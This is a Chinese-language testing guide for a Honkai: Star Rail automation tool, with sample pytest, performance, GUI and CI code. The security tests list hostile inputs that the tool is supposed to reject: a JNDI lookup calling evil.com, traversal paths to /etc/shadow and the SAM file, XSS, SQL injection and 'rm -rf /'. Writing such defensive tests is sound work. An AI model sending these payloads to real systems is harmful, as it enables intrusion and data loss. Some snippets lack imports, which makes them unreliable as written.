# 测试指南

## 目录

1. [概述](#概述)
2. [测试策略](#测试策略)
3. [测试环境](#测试环境)
4. [单元测试](#单元测试)
5. [集成测试](#集成测试)
6. [系统测试](#系统测试)
7. [性能测试](#性能测试)
8. [安全测试](#安全测试)
9. [用户界面测试](#用户界面测试)
10. [自动化测试](#自动化测试)
11. [测试数据管理](#测试数据管理)
12. [缺陷管理](#缺陷管理)
13. [测试报告](#测试报告)
14. [持续集成](#持续集成)

## 概述

本文档为崩坏星穹铁道自动化助手项目提供全面的测试指南，包括测试策略、测试方法、测试工具和最佳实践。

### 测试目标

- **功能正确性**: 确保所有功能按预期工作
- **性能稳定性**: 验证系统在各种负载下的表现
- **用户体验**: 保证界面友好和操作流畅
- **安全可靠**: 确保系统安全和数据保护
- **兼容性**: 验证在不同环境下的兼容性

### 测试原则

- **测试驱动开发 (TDD)**: 先写测试，再写代码
- **自动化优先**: 尽可能自动化测试流程
- **持续测试**: 集成到CI/CD流程中
- **风险导向**: 重点测试高风险和核心功能
- **可重复性**: 测试结果应该可重复和可预测

## 测试策略

### 测试金字塔

```
        ┌─────────────────┐
        │   手工测试      │  5%
        │  (探索性测试)    │
        ├─────────────────┤
        │   E2E测试       │  15%
        │  (端到端测试)    │
        ├─────────────────┤
        │   集成测试      │  30%
        │ (API/组件测试)   │
        ├─────────────────┤
        │   单元测试      │  50%
        │ (函数/类测试)    │
        └─────────────────┘
```

### 测试分层策略

#### 1. 单元测试 (50%)
- **范围**: 函数、类、模块
- **工具**: pytest, unittest
- **目标**: 快速反馈，高覆盖率
- **执行频率**: 每次代码提交

#### 2. 集成测试 (30%)
- **范围**: 模块间交互
- **工具**: pytest, docker-compose
- **目标**: 验证接口和数据流
- **执行频率**: 每日构建

#### 3. 端到端测试 (15%)
- **范围**: 完整用户场景
- **工具**: Selenium, PyAutoGUI
- **目标**: 验证用户工作流
- **执行频率**: 发布前

#### 4. 手工测试 (5%)
- **范围**: 探索性测试
- **工具**: 手工操作
- **目标**: 发现意外问题
- **执行频率**: 重要发布前

## 测试环境

### 环境配置

#### 开发环境
```bash
# 安装测试依赖
pip install -r requirements-dev.txt

# 配置测试环境变量
export TESTING=true
export TEST_DATABASE_URL="sqlite:///test.db"
export LOG_LEVEL="DEBUG"
```

#### 测试环境矩阵

| 环境类型 | 操作系统 | Python版本 | 分辨率 | 游戏版本 |
|---------|---------|-----------|--------|----------|
| 开发环境 | Windows 11 | 3.13 | 1920x1080 | 最新版 |
| 测试环境1 | Windows 10 | 3.13 | 1366x768 | 最新版 |
| 测试环境2 | Windows 11 | 3.13 | 2560x1440 | 最新版 |
| 兼容性测试 | Windows 10 | 3.11 | 1920x1080 | 历史版本 |

### 测试数据准备

```python
# conftest.py
import pytest
import tempfile
import shutil
from pathlib import Path

@pytest.fixture(scope="session")
def test_data_dir():
    """创建测试数据目录"""
    temp_dir = tempfile.mkdtemp()
    
    # 复制测试资源
    test_resources = Path("tests/resources")
    if test_resources.exists():
        shutil.copytree(test_resources, Path(temp_dir) / "resources")
    
    yield Path(temp_dir)
    
    # 清理
    shutil.rmtree(temp_dir)

@pytest.fixture
def mock_game_window():
    """模拟游戏窗口"""
    from unittest.mock import Mock
    
    window = Mock()
    window.title = "崩坏：星穹铁道"
    window.rect = (100, 100, 1920, 1080)
    window.is_visible = True
    
    return window

@pytest.fixture
def sample_screenshot(test_data_dir):
    """提供示例截图"""
    screenshot_path = test_data_dir / "resources" / "screenshots" / "main_menu.png"
    if not screenshot_path.exists():
        # 创建空白测试图像
        from PIL import Image
        img = Image.new('RGB', (1920, 1080), color='black')
        screenshot_path.parent.mkdir(parents=True, exist_ok=True)
        img.save(screenshot_path)
    
    return screenshot_path
```

## 单元测试

### 测试结构

```
tests/
├── unit/
│   ├── core/
│   │   ├── test_game_detector.py
│   │   ├── test_game_operator.py
│   │   ├── test_template_matcher.py
│   │   └── test_ocr_detector.py
│   ├── services/
│   │   ├── test_task_manager.py
│   │   ├── test_config_manager.py
│   │   └── test_event_bus.py
│   └── utils/
│       ├── test_image_utils.py
│       └── test_file_utils.py
├── integration/
├── e2e/
└── resources/
```

### 单元测试示例

#### 游戏检测器测试

```python
# tests/unit/core/test_game_detector.py
import pytest
import numpy as np
from unittest.mock import Mock, patch
from src.core.game_detector import GameDetector, DetectionResult

class TestGameDetector:
    
    @pytest.fixture
    def detector(self):
        return GameDetector()
    
    @pytest.fixture
    def mock_screenshot(self):
        # 创建模拟截图
        return np.zeros((1080, 1920, 3), dtype=np.uint8)
    
    def test_find_game_window_success(self, detector):
        """测试成功找到游戏窗口"""
        with patch('src.core.game_detector.win32gui') as mock_win32:
            mock_win32.FindWindow.return_value = 12345
            mock_win32.GetWindowText.return_value = "崩坏：星穹铁道"
            mock_win32.GetWindowRect.return_value = (100, 100, 1920, 1080)
            
            window_info = detector.find_game_window()
            
            assert window_info is not None
            assert window_info.title == "崩坏：星穹铁道"
            assert window_info.rect == (100, 100, 1920, 1080)
    
    def test_find_game_window_not_found(self, detector):
        """测试游戏窗口未找到"""
        with patch('src.core.game_detector.win32gui') as mock_win32:
            mock_win32.FindWindow.return_value = 0
            
            window_info = detector.find_game_window()
            
            assert window_info is None
    
    def test_detect_template_success(self, detector, mock_screenshot):
        """测试模板检测成功"""
        with patch.object(detector, 'capture_screenshot') as mock_capture:
            mock_capture.return_value = mock_screenshot
            
            with patch.object(detector.template_matcher, 'match') as mock_match:
                mock_match.return_value = DetectionResult(
                    found=True,
                    confidence=0.95,
                    position=(100, 200),
                    template_name="start_button"
                )
                
                result = detector.detect_template("start_button")
                
                assert result.found is True
                assert result.confidence == 0.95
                assert result.position == (100, 200)
    
    def test_detect_template_failure(self, detector, mock_screenshot):
        """测试模板检测失败"""
        with patch.object(detector, 'capture_screenshot') as mock_capture:
            mock_capture.return_value = mock_screenshot
            
            with patch.object(detector.template_matcher, 'match') as mock_match:
                mock_match.return_value = DetectionResult(
                    found=False,
                    confidence=0.3,
                    position=None,
                    template_name="start_button"
                )
                
                result = detector.detect_template("start_button")
                
                assert result.found is False
                assert result.confidence == 0.3
                assert result.position is None
    
    @pytest.mark.parametrize("template_name,expected_found", [
        ("start_button", True),
        ("settings_icon", True),
        ("nonexistent_template", False),
    ])
    def test_detect_multiple_templates(self, detector, mock_screenshot, 
                                     template_name, expected_found):
        """参数化测试多个模板"""
        with patch.object(detector, 'capture_screenshot') as mock_capture:
            mock_capture.return_value = mock_screenshot
            
            with patch.object(detector.template_matcher, 'match') as mock_match:
                if expected_found:
                    mock_match.return_value = DetectionResult(
                        found=True, confidence=0.9, 
                        position=(100, 100), template_name=template_name
                    )
                else:
                    mock_match.side_effect = FileNotFoundError("Template not found")
                
                if expected_found:
                    result = detector.detect_template(template_name)
                    assert result.found is True
                else:
                    with pytest.raises(FileNotFoundError):
                        detector.detect_template(template_name)
```

#### 任务管理器测试

```python
# tests/unit/services/test_task_manager.py
import pytest
import asyncio
from unittest.mock import Mock, AsyncMock
from src.services.task_manager import TaskManager, TaskConfig, TaskState
from src.core.tasks.base_task import BaseTask

class TestTaskManager:
    
    @pytest.fixture
    def task_manager(self):
        return TaskManager()
    
    @pytest.fixture
    def mock_task(self):
        task = Mock(spec=BaseTask)
        task.id = "test_task_001"
        task.name = "测试任务"
        task.execute = AsyncMock(return_value={"status": "success"})
        task.check_prerequisites = AsyncMock(return_value=True)
        task.initialize_resources = AsyncMock()
        task.cleanup_resources = AsyncMock()
        return task
    
    def test_create_task(self, task_manager):
        """测试创建任务"""
        config = TaskConfig(
            name="测试任务",
            task_type="daily",
            parameters={"target": "daily_mission"}
        )
        
        task_id = task_manager.create_task(config)
        
        assert task_id is not None
        assert len(task_id) > 0
        assert task_id in task_manager.tasks
    
    @pytest.mark.asyncio
    async def test_execute_task_success(self, task_manager, mock_task):
        """测试任务执行成功"""
        task_manager.tasks[mock_task.id] = mock_task
        
        result = await task_manager.execute_task(mock_task.id)
        
        assert result["status"] == "success"
        mock_task.check_prerequisites.assert_called_once()
        mock_task.initialize_resources.assert_called_once()
        mock_task.execute.assert_called_once()
        mock_task.cleanup_resources.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_execute_task_prerequisites_failed(self, task_manager, mock_task):
        """测试任务前置条件检查失败"""
        mock_task.check_prerequisites.return_value = False
        task_manager.tasks[mock_task.id] = mock_task
        
        with pytest.raises(Exception) as exc_info:
            await task_manager.execute_task(mock_task.id)
        
        assert "Prerequisites not met" in str(exc_info.value)
        mock_task.execute.assert_not_called()
    
    @pytest.mark.asyncio
    async def test_execute_task_execution_failed(self, task_manager, mock_task):
        """测试任务执行失败"""
        mock_task.execute.side_effect = Exception("Execution failed")
        task_manager.tasks[mock_task.id] = mock_task
        
        with pytest.raises(Exception) as exc_info:
            await task_manager.execute_task(mock_task.id)
        
        assert "Execution failed" in str(exc_info.value)
        # 确保清理资源被调用
        mock_task.cleanup_resources.assert_called_once()
    
    def test_get_task_status(self, task_manager, mock_task):
        """测试获取任务状态"""
        task_manager.tasks[mock_task.id] = mock_task
        task_manager.task_states[mock_task.id] = TaskState.RUNNING
        
        status = task_manager.get_task_status(mock_task.id)
        
        assert status == TaskState.RUNNING
    
    def test_list_tasks(self, task_manager):
        """测试列出所有任务"""
        # 创建多个任务
        configs = [
            TaskConfig(name="任务1", task_type="daily", parameters={}),
            TaskConfig(name="任务2", task_type="weekly", parameters={}),
        ]
        
        task_ids = []
        for config in configs:
            task_id = task_manager.create_task(config)
            task_ids.append(task_id)
        
        tasks = task_manager.list_tasks()
        
        assert len(tasks) == 2
        assert all(task.id in task_ids for task in tasks)
    
    def test_delete_task(self, task_manager, mock_task):
        """测试删除任务"""
        task_manager.tasks[mock_task.id] = mock_task
        
        success = task_manager.delete_task(mock_task.id)
        
        assert success is True
        assert mock_task.id not in task_manager.tasks
    
    def test_delete_nonexistent_task(self, task_manager):
        """测试删除不存在的任务"""
        success = task_manager.delete_task("nonexistent_task")
        
        assert success is False
```

### 测试覆盖率

```bash
# 运行测试并生成覆盖率报告
pytest --cov=src --cov-report=html --cov-report=term-missing

# 查看覆盖率报告
open htmlcov/index.html
```

**覆盖率目标**:
- 单元测试覆盖率: ≥ 90%
- 分支覆盖率: ≥ 85%
- 核心模块覆盖率: ≥ 95%

## 集成测试

### 模块间集成测试

```python
# tests/integration/test_game_automation_integration.py
import pytest
import asyncio
from src.core.game_detector import GameDetector
from src.core.game_operator import GameOperator
from src.services.task_manager import TaskManager
from src.core.tasks.daily_task import DailyTask

class TestGameAutomationIntegration:
    
    @pytest.fixture
    def automation_system(self):
        """创建完整的自动化系统"""
        detector = GameDetector()
        operator = GameOperator()
        task_manager = TaskManager()
        
        return {
            'detector': detector,
            'operator': operator,
            'task_manager': task_manager
        }
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_daily_task_execution_flow(self, automation_system):
        """测试每日任务完整执行流程"""
        detector = automation_system['detector']
        operator = automation_system['operator']
        task_manager = automation_system['task_manager']
        
        # 创建每日任务
        task_config = {
            'name': '每日任务测试',
            'task_type': 'daily',
            'parameters': {
                'missions': ['daily_training', 'daily_material']
            }
        }
        
        task = DailyTask(task_config, detector, operator)
        
        # 模拟游戏环境
        with patch.object(detector, 'find_game_window') as mock_find_window:
            mock_find_window.return_value = Mock(
                title="崩坏：星穹铁道",
                rect=(0, 0, 1920, 1080)
            )
            
            with patch.object(detector, 'detect_template') as mock_detect:
                # 模拟检测到主菜单
                mock_detect.return_value = Mock(
                    found=True,
                    confidence=0.95,
                    position=(960, 540)
                )
                
                with patch.object(operator, 'click') as mock_click:
                    mock_click.return_value = Mock(success=True)
                    
                    # 执行任务
                    result = await task.execute()
                    
                    # 验证结果
                    assert result['status'] == 'completed'
                    assert 'missions_completed' in result
                    
                    # 验证交互
                    assert mock_find_window.called
                    assert mock_detect.called
                    assert mock_click.called
    
    @pytest.mark.integration
    def test_config_and_task_integration(self, automation_system):
        """测试配置管理和任务管理集成"""
        from src.services.config_manager import ConfigManager
        
        config_manager = ConfigManager()
        task_manager = automation_system['task_manager']
        
        # 设置配置
        config_manager.set('tasks.daily.enabled', True)
        config_manager.set('tasks.daily.schedule', '09:00')
        
        # 基于配置创建任务
        if config_manager.get('tasks.daily.enabled'):
            task_config = {
                'name': '配置驱动的每日任务',
                'task_type': 'daily',
                'schedule': config_manager.get('tasks.daily.schedule'),
                'parameters': {}
            }
            
            task_id = task_manager.create_task(task_config)
            
            assert task_id is not None
            task = task_manager.get_task(task_id)
            assert task.schedule == '09:00'
```

### API集成测试

```python
# tests/integration/test_api_integration.py
import pytest
import json
from src.api.internal_api import InternalAPIServer
from src.services.task_manager import TaskManager

class TestAPIIntegration:
    
    @pytest.fixture
    def api_server(self):
        task_manager = TaskManager()
        return InternalAPIServer(task_manager)
    
    @pytest.mark.asyncio
    async def test_task_crud_operations(self, api_server):
        """测试任务CRUD操作的完整流程"""
        
        # 1. 创建任务
        create_request = Mock(
            json={
                'name': 'API测试任务',
                'task_type': 'daily',
                'parameters': {'target': 'test'}
            }
        )
        
        create_response = await api_server.create_task(create_request)
        assert create_response.status == 201
        task_id = create_response.data['task_id']
        
        # 2. 获取任务
        get_request = Mock(path_params={'task_id': task_id})
        get_response = await api_server.get_task(get_request)
        assert get_response.status == 200
        assert get_response.data['name'] == 'API测试任务'
        
        # 3. 更新任务
        update_request = Mock(
            path_params={'task_id': task_id},
            json={'name': 'API测试任务(已更新)'}
        )
        
        update_response = await api_server.update_task(update_request)
        assert update_response.status == 200
        
        # 4. 验证更新
        get_response = await api_server.get_task(get_request)
        assert get_response.data['name'] == 'API测试任务(已更新)'
        
        # 5. 删除任务
        delete_request = Mock(path_params={'task_id': task_id})
        delete_response = await api_server.delete_task(delete_request)
        assert delete_response.status == 204
        
        # 6. 验证删除
        get_response = await api_server.get_task(get_request)
        assert get_response.status == 404
```

## 系统测试

### 端到端测试

```python
# tests/e2e/test_user_workflows.py
import pytest
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class TestUserWorkflows:
    
    @pytest.fixture(scope="class")
    def app_driver(self):
        """启动应用程序"""
        # 这里使用PyAutoGUI或其他工具控制桌面应用
        import subprocess
        import pyautogui
        
        # 启动应用
        process = subprocess.Popen(['python', 'main.py'])
        time.sleep(3)  # 等待应用启动
        
        yield pyautogui
        
        # 清理
        process.terminate()
    
    @pytest.mark.e2e
    def test_create_and_execute_daily_task(self, app_driver):
        """测试创建和执行每日任务的完整流程"""
        gui = app_driver
        
        # 1. 点击创建任务按钮
        create_button = gui.locateOnScreen('tests/resources/ui/create_task_button.png')
        gui.click(create_button)
        
        # 2. 填写任务信息
        task_name_field = gui.locateOnScreen('tests/resources/ui/task_name_field.png')
        gui.click(task_name_field)
        gui.typewrite('E2E测试任务')
        
        # 3. 选择任务类型
        task_type_dropdown = gui.locateOnScreen('tests/resources/ui/task_type_dropdown.png')
        gui.click(task_type_dropdown)
        
        daily_option = gui.locateOnScreen('tests/resources/ui/daily_option.png')
        gui.click(daily_option)
        
        # 4. 保存任务
        save_button = gui.locateOnScreen('tests/resources/ui/save_button.png')
        gui.click(save_button)
        
        # 5. 验证任务创建成功
        success_message = gui.locateOnScreen('tests/resources/ui/success_message.png')
        assert success_message is not None
        
        # 6. 执行任务
        execute_button = gui.locateOnScreen('tests/resources/ui/execute_button.png')
        gui.click(execute_button)
        
        # 7. 等待任务完成
        time.sleep(10)
        
        # 8. 验证任务执行结果
        completed_status = gui.locateOnScreen('tests/resources/ui/completed_status.png')
        assert completed_status is not None
    
    @pytest.mark.e2e
    def test_settings_configuration(self, app_driver):
        """测试设置配置流程"""
        gui = app_driver
        
        # 1. 打开设置页面
        settings_button = gui.locateOnScreen('tests/resources/ui/settings_button.png')
        gui.click(settings_button)
        
        # 2. 修改游戏路径
        game_path_field = gui.locateOnScreen('tests/resources/ui/game_path_field.png')
        gui.click(game_path_field)
        gui.hotkey('ctrl', 'a')  # 全选
        gui.typewrite('C:\\Games\\StarRail\\Game.exe')
        
        # 3. 修改检测间隔
        detection_interval = gui.locateOnScreen('tests/resources/ui/detection_interval.png')
        gui.click(detection_interval)
        gui.hotkey('ctrl', 'a')
        gui.typewrite('1000')
        
        # 4. 保存设置
        save_settings_button = gui.locateOnScreen('tests/resources/ui/save_settings_button.png')
        gui.click(save_settings_button)
        
        # 5. 验证设置保存成功
        settings_saved_message = gui.locateOnScreen('tests/resources/ui/settings_saved_message.png')
        assert settings_saved_message is not None
```

### 兼容性测试

```python
# tests/system/test_compatibility.py
import pytest
import platform
import sys
from src.utils.system_info import get_system_info

class TestCompatibility:
    
    def test_python_version_compatibility(self):
        """测试Python版本兼容性"""
        version_info = sys.version_info
        assert version_info.major == 3
        assert version_info.minor >= 11  # 最低支持Python 3.11
    
    def test_operating_system_compatibility(self):
        """测试操作系统兼容性"""
        system = platform.system()
        assert system == 'Windows'  # 目前只支持Windows
        
        version = platform.version()
        # Windows 10及以上
        assert '10.' in version or '11.' in version
    
    @pytest.mark.parametrize("resolution", [
        (1366, 768),
        (1920, 1080),
        (2560, 1440),
        (3840, 2160)
    ])
    def test_screen_resolution_compatibility(self, resolution):
        """测试不同分辨率的兼容性"""
        width, height = resolution
        
        from src.core.game_detector import GameDetector
        detector = GameDetector()
        
        # 模拟不同分辨率下的检测
        with patch.object(detector, 'get_screen_resolution') as mock_resolution:
            mock_resolution.return_value = (width, height)
            
            # 验证检测器能够适应不同分辨率
            scaling_factor = detector.calculate_scaling_factor()
            assert 0.5 <= scaling_factor <= 2.0
    
    def test_game_version_compatibility(self):
        """测试游戏版本兼容性"""
        from src.core.game_detector import GameDetector
        
        detector = GameDetector()
        
        # 测试不同游戏版本的模板
        supported_versions = ['1.0.0', '1.1.0', '1.2.0', '1.3.0']
        
        for version in supported_versions:
            template_path = f"templates/v{version}/main_menu.png"
            # 验证模板文件存在
            assert detector.template_manager.has_template(template_path)
```

## 性能测试

### 负载测试

```python
# tests/performance/test_load.py
import pytest
import asyncio
import time
import statistics
from concurrent.futures import ThreadPoolExecutor
from src.core.game_detector import GameDetector
from src.services.task_manager import TaskManager

class TestPerformance:
    
    @pytest.mark.performance
    def test_template_matching_performance(self):
        """测试模板匹配性能"""
        detector = GameDetector()
        
        # 准备测试数据
        test_image = np.random.randint(0, 255, (1080, 1920, 3), dtype=np.uint8)
        template_name = "start_button"
        
        # 性能测试
        execution_times = []
        
        for _ in range(100):
            start_time = time.perf_counter()
            
            with patch.object(detector, 'capture_screenshot') as mock_capture:
                mock_capture.return_value = test_image
                result = detector.detect_template(template_name)
            
            end_time = time.perf_counter()
            execution_times.append(end_time - start_time)
        
        # 性能指标验证
        avg_time = statistics.mean(execution_times)
        max_time = max(execution_times)
        
        assert avg_time < 0.5  # 平均执行时间小于500ms
        assert max_time < 1.0  # 最大执行时间小于1s
        
        print(f"平均执行时间: {avg_time:.3f}s")
        print(f"最大执行时间: {max_time:.3f}s")
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_task_execution(self):
        """测试并发任务执行性能"""
        task_manager = TaskManager()
        
        # 创建多个任务
        task_configs = [
            {'name': f'性能测试任务{i}', 'task_type': 'daily', 'parameters': {}}
            for i in range(10)
        ]
        
        tasks = []
        for config in task_configs:
            task = Mock()
            task.id = f"perf_task_{len(tasks)}"
            task.execute = AsyncMock(return_value={'status': 'completed'})
            task.check_prerequisites = AsyncMock(return_value=True)
            task.initialize_resources = AsyncMock()
            task.cleanup_resources = AsyncMock()
            tasks.append(task)
        
        # 并发执行测试
        start_time = time.perf_counter()
        
        results = await asyncio.gather(*[
            task_manager.execute_task_direct(task) for task in tasks
        ])
        
        end_time = time.perf_counter()
        total_time = end_time - start_time
        
        # 验证结果
        assert len(results) == 10
        assert all(result['status'] == 'completed' for result in results)
        assert total_time < 5.0  # 总执行时间小于5秒
        
        print(f"并发执行10个任务总时间: {total_time:.3f}s")
    
    @pytest.mark.performance
    def test_memory_usage(self):
        """测试内存使用情况"""
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # 执行大量操作
        detector = GameDetector()
        
        for _ in range(1000):
            test_image = np.random.randint(0, 255, (1080, 1920, 3), dtype=np.uint8)
            with patch.object(detector, 'capture_screenshot') as mock_capture:
                mock_capture.return_value = test_image
                detector.detect_template("test_template")
        
        # 强制垃圾回收
        gc.collect()
        
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = final_memory - initial_memory
        
        # 内存增长应该在合理范围内
        assert memory_increase < 100  # 内存增长小于100MB
        
        print(f"初始内存: {initial_memory:.2f}MB")
        print(f"最终内存: {final_memory:.2f}MB")
        print(f"内存增长: {memory_increase:.2f}MB")
```

### 压力测试

```python
# tests/performance/test_stress.py
import pytest
import threading
import time
from src.services.event_bus import EventBus

class TestStress:
    
    @pytest.mark.stress
    def test_event_bus_stress(self):
        """测试事件总线压力"""
        event_bus = EventBus()
        
        # 事件计数器
        event_count = {'published': 0, 'received': 0}
        event_lock = threading.Lock()
        
        def event_handler(data):
            with event_lock:
                event_count['received'] += 1
        
        # 注册多个订阅者
        for i in range(100):
            event_bus.subscribe(f'test_event_{i % 10}', event_handler)
        
        # 多线程发布事件
        def publish_events():
            for i in range(1000):
                event_bus.publish(f'test_event_{i % 10}', {'data': i})
                with event_lock:
                    event_count['published'] += 1
        
        # 启动多个发布线程
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=publish_events)
            threads.append(thread)
            thread.start()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        # 等待事件处理完成
        time.sleep(1)
        
        # 验证结果
        assert event_count['published'] == 10000
        # 每个事件应该被10个订阅者接收
        assert event_count['received'] == 100000
    
    @pytest.mark.stress
    def test_database_stress(self):
        """测试数据库压力"""
        from src.data.database import Database
        
        db = Database(':memory:')  # 使用内存数据库
        
        # 并发写入测试
        def write_data(thread_id):
            for i in range(1000):
                db.execute(
                    "INSERT INTO task_executions (task_name, status) VALUES (?, ?)",
                    (f"stress_task_{thread_id}_{i}", "completed")
                )
        
        # 启动多个写入线程
        threads = []
        for i in range(10):
            thread = threading.Thread(target=write_data, args=(i,))
            threads.append(thread)
            thread.start()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        # 验证数据完整性
        result = db.execute("SELECT COUNT(*) FROM task_executions")
        assert result[0][0] == 10000
```

## 安全测试

### 输入验证测试

```python
# tests/security/test_input_validation.py
import pytest
from src.services.config_manager import ConfigManager
from src.api.internal_api import InternalAPIServer

class TestInputValidation:
    
    @pytest.mark.security
    def test_config_injection_protection(self):
        """测试配置注入保护"""
        config_manager = ConfigManager()
        
        # 尝试注入恶意配置
        malicious_inputs = [
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "\x00\x01\x02",  # 空字节注入
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises((ValueError, SecurityError)):
                config_manager.set('malicious_key', malicious_input)
    
    @pytest.mark.security
    def test_path_traversal_protection(self):
        """测试路径遍历保护"""
        from src.utils.file_utils import safe_file_read
        
        # 尝试路径遍历攻击
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, PermissionError, FileNotFoundError)):
                safe_file_read(malicious_path)
    
    @pytest.mark.security
    def test_api_input_sanitization(self):
        """测试API输入清理"""
        api_server = InternalAPIServer(Mock())
        
        # 测试恶意JSON输入
        malicious_json = {
            'name': '<script>alert("xss")</script>',
            'task_type': '../../../etc/passwd',
            'parameters': {
                'command': 'rm -rf /',
                'eval': 'eval("malicious_code()")',
            }
        }
        
        request = Mock(json=malicious_json)
        
        with pytest.raises((ValueError, SecurityError)):
            await api_server.create_task(request)
```

### 权限测试

```python
# tests/security/test_permissions.py
import pytest
from src.security.permission_manager import PermissionManager

class TestPermissions:
    
    @pytest.fixture
    def permission_manager(self):
        pm = PermissionManager()
        pm.add_user('admin', ['system.admin'])
        pm.add_user('user', ['task.executor'])
        pm.add_user('guest', [])
        return pm
    
    @pytest.mark.security
    def test_admin_permissions(self, permission_manager):
        """测试管理员权限"""
        assert permission_manager.check_permission('admin', 'system.shutdown')
        assert permission_manager.check_permission('admin', 'task.create')
        assert permission_manager.check_permission('admin', 'config.modify')
    
    @pytest.mark.security
    def test_user_permissions(self, permission_manager):
        """测试普通用户权限"""
        assert permission_manager.check_permission('user', 'task.execute')
        assert not permission_manager.check_permission('user', 'system.shutdown')
        assert not permission_manager.check_permission('user', 'config.modify')
    
    @pytest.mark.security
    def test_guest_permissions(self, permission_manager):
        """测试访客权限"""
        assert not permission_manager.check_permission('guest', 'task.execute')
        assert not permission_manager.check_permission('guest', 'system.shutdown')
        assert not permission_manager.check_permission('guest', 'config.read')
    
    @pytest.mark.security
    def test_privilege_escalation_protection(self, permission_manager):
        """测试权限提升保护"""
        # 尝试通过恶意输入提升权限
        malicious_actions = [
            'system.admin.*',
            'system.*',
            '*',
            'task.execute; system.shutdown',
        ]
        
        for action in malicious_actions:
            assert not permission_manager.check_permission('user', action)
```

## 用户界面测试

### GUI自动化测试

```python
# tests/ui/test_gui_automation.py
import pytest
import pyautogui
from PyQt6.QtTest import QTest
from PyQt6.QtCore import Qt
from src.ui.main_window import MainWindow

class TestGUIAutomation:
    
    @pytest.fixture
    def main_window(self, qtbot):
        window = MainWindow()
        qtbot.addWidget(window)
        window.show()
        return window
    
    def test_task_creation_ui(self, qtbot, main_window):
        """测试任务创建界面"""
        # 点击创建任务按钮
        create_button = main_window.create_task_button
        qtbot.mouseClick(create_button, Qt.MouseButton.LeftButton)
        
        # 验证任务创建对话框打开
        assert main_window.task_creation_dialog.isVisible()
        
        # 填写任务名称
        name_field = main_window.task_creation_dialog.name_field
        qtbot.keyClicks(name_field, "UI测试任务")
        
        # 选择任务类型
        type_combo = main_window.task_creation_dialog.type_combo
        type_combo.setCurrentText("每日任务")
        
        # 点击保存按钮
        save_button = main_window.task_creation_dialog.save_button
        qtbot.mouseClick(save_button, Qt.MouseButton.LeftButton)
        
        # 验证任务添加到列表
        task_list = main_window.task_list
        assert task_list.count() == 1
        assert "UI测试任务" in task_list.item(0).text()
    
    def test_settings_ui(self, qtbot, main_window):
        """测试设置界面"""
        # 打开设置对话框
        settings_action = main_window.settings_action
        settings_action.trigger()
        
        # 验证设置对话框打开
        assert main_window.settings_dialog.isVisible()
        
        # 修改游戏路径
        game_path_field = main_window.settings_dialog.game_path_field
        qtbot.keyClicks(game_path_field, "C:\\Games\\StarRail\\Game.exe")
        
        # 修改检测间隔
        interval_spinbox = main_window.settings_dialog.detection_interval_spinbox
        interval_spinbox.setValue(1000)
        
        # 保存设置
        save_button = main_window.settings_dialog.save_button
        qtbot.mouseClick(save_button, Qt.MouseButton.LeftButton)
        
        # 验证设置保存成功
        assert main_window.config_manager.get('game.path') == "C:\\Games\\StarRail\\Game.exe"
        assert main_window.config_manager.get('detection.interval') == 1000
    
    def test_task_execution_ui(self, qtbot, main_window):
        """测试任务执行界面"""
        # 先创建一个任务
        main_window.task_manager.create_task({
            'name': '执行测试任务',
            'task_type': 'daily',
            'parameters': {}
        })
        
        # 刷新任务列表
        main_window.refresh_task_list()
        
        # 选择任务
        task_list = main_window.task_list
        task_list.setCurrentRow(0)
        
        # 点击执行按钮
        execute_button = main_window.execute_button
        qtbot.mouseClick(execute_button, Qt.MouseButton.LeftButton)
        
        # 验证执行状态更新
        status_label = main_window.status_label
        QTest.qWait(1000)  # 等待状态更新
        assert "执行中" in status_label.text() or "已完成" in status_label.text()
```

### 可访问性测试

```python
# tests/ui/test_accessibility.py
import pytest
from PyQt6.QtCore import Qt
from src.ui.main_window import MainWindow

class TestAccessibility:
    
    @pytest.fixture
    def main_window(self, qtbot):
        window = MainWindow()
        qtbot.addWidget(window)
        return window
    
    def test_keyboard_navigation(self, qtbot, main_window):
        """测试键盘导航"""
        main_window.show()
        
        # 测试Tab键导航
        qtbot.keyPress(main_window, Qt.Key.Key_Tab)
        focused_widget = main_window.focusWidget()
        assert focused_widget is not None
        
        # 继续Tab导航
        qtbot.keyPress(main_window, Qt.Key.Key_Tab)
        next_focused = main_window.focusWidget()
        assert next_focused != focused_widget
    
    def test_accessibility_properties(self, main_window):
        """测试可访问性属性"""
        # 检查重要控件是否有可访问性文本
        create_button = main_window.create_task_button
        assert create_button.accessibleName() != ""
        assert create_button.accessibleDescription() != ""
        
        # 检查输入字段是否有标签
        if hasattr(main_window, 'task_name_field'):
            name_field = main_window.task_name_field
            assert name_field.accessibleName() != ""
    
    def test_high_contrast_support(self, main_window):
        """测试高对比度支持"""
        # 应用高对比度样式
        main_window.setStyleSheet("""
            QWidget {
                background-color: black;
                color: white;
            }
            QPushButton {
                background-color: white;
                color: black;
                border: 2px solid white;
            }
        """)
        
        # 验证样式应用成功
        assert "black" in main_window.styleSheet().lower()
        assert "white" in main_window.styleSheet().lower()
```

## 自动化测试

### CI/CD集成

```yaml
# .github/workflows/test.yml
name: 测试流水线

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: windows-latest
    strategy:
      matrix:
        python-version: [3.11, 3.12, 3.13]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: 设置Python环境
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: 安装依赖
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements-dev.txt
    
    - name: 运行单元测试
      run: |
        pytest tests/unit/ -v --cov=src --cov-report=xml
    
